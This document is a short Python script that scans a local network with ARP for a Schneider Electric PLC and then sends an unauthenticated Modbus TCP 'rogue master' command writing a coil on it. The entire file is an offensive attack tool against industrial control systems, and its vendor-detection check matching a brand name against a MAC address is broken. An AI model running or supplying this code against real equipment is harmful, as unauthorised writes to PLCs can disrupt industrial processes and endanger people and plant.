import os
import time
from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient

def discover_plc_ip(network_range):
    """
    Discover the IP address of the PLC using ARP scanning.
    :param network_range: The network range to scan (e.g., '192.168.1.0/24')
    :return: The IP address of the PLC
    """
    print(f"Scanning network {network_range} for PLC...")
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=2, verbose=0)[0]

    for sent, received in result:
        if "Schneider Electric" in received.hwsrc:  # Assuming Schneider Electric MAC prefix
            print(f"Found PLC at IP: {received.psrc}")
            return received.psrc

    print("PLC not found in the network.")
    return None

def rogue_master_attack(plc_ip):
    """
    Simulate a rogue master attack by sending Modbus commands to the PLC.
    :param plc_ip: The IP address of the PLC
    """
    print(f"Attempting to connect to PLC at {plc_ip}...")
    try:
        client = ModbusTcpClient(plc_ip)
        if client.connect():
            print("Connected to PLC. Sending rogue commands...")
            # Example: Write to a coil (Modbus function code 0x05)
            client.write_coil(0, True)  # Turn on coil at address 0
            print("Command sent: Turn on coil at address 0")
            client.close()
        else:
            print("Failed to connect to PLC.")
    except Exception as e:
        print(f"Error during Modbus communication: {e}")

if __name__ == "__main__":
    # Define the network range to scan
    network_range = "192.168.1.0/24"

    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip(network_range)

    if plc_ip:
        # Step 2: Perform the Rogue Master attack
        rogue_master_attack(plc_ip)
    else:
        print("Cannot proceed without the PLC's IP address.")